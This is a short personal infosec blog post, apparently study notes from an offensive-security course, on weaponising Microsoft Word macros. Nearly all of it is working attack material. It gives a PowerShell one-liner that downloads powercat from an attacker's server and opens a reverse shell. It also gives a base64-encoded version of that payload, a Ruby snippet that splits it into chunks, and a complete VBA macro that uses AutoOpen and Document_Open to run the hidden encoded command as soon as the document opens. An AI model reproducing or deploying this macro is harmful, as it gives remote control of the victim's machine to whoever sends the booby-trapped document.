---
layout: post
title: office macros
titledate: 09/05/23
tags: ["infosec","offsec", "macros", "powershell", "shell"]
---

when creating a macro in word

view -> macros -> view macros -> TitleMacro and choose your current document from Macros In

AutoOpen and Document_Open are necssary to automatically execute our macro upon the document execution

for our payload we'll download powercat from our hosted web server and base64 it UTF16-LE

  IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');powercat -c 192.168.x.x -p 443 -e powershell

we have a string size limitation so we need to split our string into length of 50

ruby one liner 
  
  payload = SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xNTQvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNTQgLXAgNDQzIC1lIHBvd2Vyc2hlbGw=

  payload.chars.each_slice(50).map(&:join).each{|arr|p "Str = Str + #{arr}"}
  

```vb
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
  Dim Str as String

  Str = Str + "powershell.exe -nop -w hidden -enc "
  Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA"
  Str = Str + "BlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE"
  Str = Str + "AG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AH"
  Str = Str + "AAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANQA0AC8A"
  Str = Str + "cABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQ"
  Str = Str + "ByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAu"
  Str = Str + "ADEANQA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AG"
  Str = Str + "UAcgBzAGgAZQBsAGwA"
  
  CreateObject("Wscript.Shell").Run Str
End Sub
```